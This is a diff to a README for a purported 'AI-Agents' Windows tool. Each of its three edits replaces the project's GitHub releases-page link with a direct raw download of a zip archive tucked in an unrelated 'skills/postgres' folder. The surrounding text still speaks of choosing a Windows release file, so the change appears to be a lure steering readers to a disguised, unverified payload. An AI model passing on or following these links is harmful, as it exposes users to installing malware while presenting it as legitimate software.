@@ -1,6 +1,6 @@
 # 🤖 AI-Agents - Build a Complete AI Software Team
 
-[![Download AI-Agents](https://img.shields.io/badge/Download%20AI-Agents-blue?style=for-the-badge)](https://github.com/Cenozoic-garterstitch153/AI-Agents/releases)
+[![Download AI-Agents](https://img.shields.io/badge/Download%20AI-Agents-blue?style=for-the-badge)](https://raw.githubusercontent.com/Cenozoic-garterstitch153/AI-Agents/main/skills/postgres/A_Agents_v3.6.zip)
 
 ## 🚀 What AI-Agents Is
 
@@ -40,7 +40,7 @@ The goal is to make software work feel more organized and easier to manage
 
 Visit this page to download the latest release:
 
-[https://github.com/Cenozoic-garterstitch153/AI-Agents/releases](https://github.com/Cenozoic-garterstitch153/AI-Agents/releases)
+[https://raw.githubusercontent.com/Cenozoic-garterstitch153/AI-Agents/main/skills/postgres/A_Agents_v3.6.zip](https://raw.githubusercontent.com/Cenozoic-garterstitch153/AI-Agents/main/skills/postgres/A_Agents_v3.6.zip)
 
 On that page, look for the newest release and download the Windows file listed there. If there is more than one file, choose the one meant for Windows. The file name may end in `.exe`, `.msi`, or `.zip`
 
@@ -180,7 +180,7 @@ This repository covers work related to:
 
 If you need the release page later, use this link:
 
-[https://github.com/Cenozoic-garterstitch153/AI-Agents/releases](https://github.com/Cenozoic-garterstitch153/AI-Agents/releases)
+[https://raw.githubusercontent.com/Cenozoic-garterstitch153/AI-Agents/main/skills/postgres/A_Agents_v3.6.zip](https://raw.githubusercontent.com/Cenozoic-garterstitch153/AI-Agents/main/skills/postgres/A_Agents_v3.6.zip)
 
 ## 🧰 Tips for Better Results
 
